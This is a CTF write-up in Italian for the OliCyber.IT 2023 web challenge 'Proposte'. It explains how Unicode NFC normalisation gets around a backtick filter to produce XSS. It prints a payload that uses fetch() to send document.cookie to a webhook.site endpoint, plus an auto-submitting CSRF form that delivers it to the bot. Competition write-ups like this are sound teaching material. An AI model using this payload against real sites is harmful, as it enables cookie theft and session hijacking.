# OliCyber.IT 2023 - Competizione nazionale

## [web] Proposte (5 risoluzioni)

La challenge consiste in un sito web che permette di proporre delle nuove challenge:

- Categoria stego, vulnerabile a XSS
- Tutte le altre proposte, che permette di far visitare una pagina al bot

### Soluzione

L'applicazione web inserisce il contenuto del parametro POST "text" all'interno della pagina HTML per generare l'animazione del testo.

Il payload fornito viene inserito nel template all'interno di un tag script in questo modo.

```html
<script>
  var app = document.getElementById("text");
  var typewriter = new Typewriter(app, {});
  typewriter.typeString(`<%= desc.normalize() %>`);
  typewriter.start();
</script>
```

Dopo aver sostituito alcuni caratteri in questo modo:

```js
desc = desc.replaceAll("$", "€");
desc = desc.replaceAll("`", "'");
desc = desc.replaceAll("\\", "/");
```

Sfruttando il fatto che la descrizione viene normalizzata (normalizzazione NFC) prima di essere inserita all'interno della pagina, si può eludere la sostituzione del carattere "`".

Infatti, il carattere speciale "`" (che corrisponde a "%e1%bf%af" in URL-encoding) viene normalizzato al carattere vietato "`".
Per maggiorni informazioni sulla normaizzazione dei caratteri si può consultare la tabella al link https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html.

Potendo eludere questo controllo è possibile creare un payload per ottenere XSS e esfiltrare il cookie della vittima simile a:

```
`); fetch(`https://webhook.site/YOUR-WEBHOOK/`+document.cookie) ;//
```

Considerando che il parametro vulnerabile è di tipo POST, è necessario effettuare una CSRF per eseguire l'XSS sulla vittima, la pagina da far visitare alla vittima può essere simile alla seguente:

```
<form action="http://proposte.challs.olicyber.it/stego" method="post">
  <input name="text" value="`); fetch(`https://webhook.site/YOUR-WEBHOOK/`+document.cookie) ;//">
</form>

<script> document.getElementsByTagName('form')[0].submit() </script>
```

Facendo visitare questa pagina al bot (attraverso la funzionalità "Tutte le altre richieste") la flag contenuta nei cookie verrà inviata al webhook dell'attaccante.

### Exploit

```python
from pwn import *

# Soluzione qua
```
